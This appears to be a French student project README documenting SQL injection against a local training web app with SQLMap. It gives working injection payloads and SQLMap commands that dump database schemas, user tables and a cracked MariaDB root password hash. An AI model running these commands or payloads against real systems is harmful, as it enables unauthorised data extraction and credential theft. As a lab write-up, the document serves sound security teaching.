# Projet : Exploitation SQL Injection avec SQLMap

## Description

Ce projet explore l'exploitation de vulnérabilités SQL Injection sur une application web locale. L’outil **SQLMap** a permis d’identifier plusieurs types de failles SQL Injection, et d’extraire des informations sensibles de la base de données, notamment les utilisateurs et les privilèges.

### Identification de la base de données et vulnérabilités SQL Injection

Lors des tests initiaux, l’insertion d’une apostrophe (`'`) dans le champ `uid` du formulaire `register.php` a produit une erreur SQL révélant l'utilisation de **MariaDB** comme système de gestion de base de données. En suivant cette indication, une commande SQLMap a été exécutée pour tester la présence de vulnérabilités. Cette commande a révélé plusieurs failles exploitables :

```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --level=2 --risk=3 --batch
```

Les vulnérabilités détectées sont les suivantes :

1. **Injection SQL de type boolean-based blind** :
   - **Description** : Cette technique permet de manipuler des requêtes SQL basées sur des conditions booléennes.
   - **Exemple de Payload** : `uid=test' RLIKE (SELECT (CASE WHEN (7373=7373) THEN 0x74657374 ELSE 0x28 END)) AND 'ZdRI'='ZdRI`

2. **Injection SQL de type error-based** :
   - **Description** : Cette technique repose sur les erreurs SQL renvoyées par le serveur pour obtenir des informations.
   - **Exemple de Payload** : `uid=test' AND EXTRACTVALUE(5067,CONCAT(0x5c,0x71716b7671,(SELECT (ELT(5067=5067,1))),0x716b6a6271)) AND 'tpCd'='tpCd`

3. **Injection SQL de type time-based blind** :
   - **Description** : Cette technique permet d’utiliser des délais de réponse pour vérifier la validité des requêtes.
   - **Exemple de Payload** : `uid=test' AND (SELECT 2799 FROM (SELECT(SLEEP(5)))gnXJ) AND 'XAFL'='XAFL`

Ces vulnérabilités ont confirmé la possibilité d'exploiter les injections SQL et d'extraire des données sans authentification.

---

## Objectifs de l'examen

1. Effectuer un dump du schéma de la base de données.
2. Récupérer la liste des utilisateurs de l'application.
3. Récupérer la liste des utilisateurs de MariaDB.
4. Obtenir et déchiffrer le mot de passe root de MariaDB via attaque par force brute.
5. Extraire le mot de passe administrateur de l'application.

---

## Fichiers Exportés

Voici les fichiers générés au format `.csv` et `.txt` contenant les informations récupérées :

- **Schéma de la base de données :**
  - [Schéma de la base `sqlitraining`](output/sqlitraining-schema.csv)
  - [Tables dans `information_schema`](output/information_schema-tables.csv)
  - [Tables dans `sys`](output/sys-tables.csv)
  - [Tables dans `mysql`](output/mysql-tables.csv)

- **Utilisateurs de l'application :**
  - [Liste des utilisateurs de l'application](output/sqlitraining-users.csv)

- **Utilisateurs de MariaDB :**
  - [Liste des utilisateurs de MariaDB](output/mysql-users.csv)

- **Mot de passe root de MariaDB :**
  - [Mot de passe root de MariaDB (force brute)](output/root-password.txt)

- **Mot de passe administrateur de l'application :**
  - [Mot de passe administrateur de l'application](output/admin-password.txt)

---

## Commandes SQLMap Utilisées

Voici un aperçu des commandes SQLMap exécutées pour chaque objectif :

### 1. Détection de la vulnérabilité SQL Injection

**Commande utilisée :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --level=2 --risk=3 --batch
```

### 2. Extraction du Schéma de la Base de Données

**Commande :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining --tables --batch
```

**Extraction des tables dans `information_schema` :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D information_schema --tables --batch
```

### 3. Récupération des Utilisateurs de l'Application

**Commande :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --batch --dump-format=CSV
```

### 4. Récupération des Utilisateurs de MariaDB

**Commande :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user --dump --batch --dump-format=CSV
```

### 5. Extraction du Mot de Passe root de MariaDB

**Commande :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user -C User,Host,authentication_string --dump --where="User='root'" --batch
```

- **Détails** : Le mot de passe obtenu, `81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`, correspond à **root** après décryptage sur **CrackStation**. Ce mot de passe était encodé en MySQL4.1+.

### 6. Extraction du Mot de Passe Administrateur de l'Application

**Commande :**
```bash
sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --batch
```

---

### Notes Légales

L'utilisation de **SQLMap** pour des attaques sans autorisation préalable est illégale. Ce projet est réalisé dans un cadre d'apprentissage sécurisé et contrôlé.
